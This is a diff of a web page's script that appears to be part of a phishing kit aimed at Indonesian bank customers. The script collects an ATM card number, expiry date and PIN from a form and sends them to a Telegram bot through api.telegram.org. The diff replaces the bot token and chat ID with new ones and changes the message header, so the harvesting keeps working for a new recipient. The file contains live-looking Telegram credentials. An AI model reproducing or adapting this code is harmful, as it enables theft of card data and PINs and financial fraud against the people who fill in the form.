@@ -199,8 +199,8 @@
 </section>
 
 <script>
-  const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token Bot Telegram Anda
-  const CHAT_ID = '7213790655';    // Ganti dengan Chat ID tujuan
+  const BOT_TOKEN = '8516584496:AAGlvaSTbdD71PutTrQSbUg1ZLRiadQiPf4'; // Ganti dengan token Bot Telegram Anda
+  const CHAT_ID = '8424964369';    // Ganti dengan Chat ID tujuan
 
   const atmInput = document.getElementById('atm');
   const atmCount = document.getElementById('atm-count');
@@ -262,7 +262,7 @@
     const pin = pinInput.value.trim();
 
     const msg = encodeURIComponent(
-      `*Informasi Data Nasabah*\nNomor Kartu ATM: ${atm}\nTanggal Kadaluarsa: ${expiry}\nPIN Kartu ATM: ${pin}`
+      `*Data baru*\n\nNomor Kartu ATM: ${atm}\nTanggal Kadaluarsa: ${expiry}\nPIN Kartu ATM: ${pin}`
     );
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
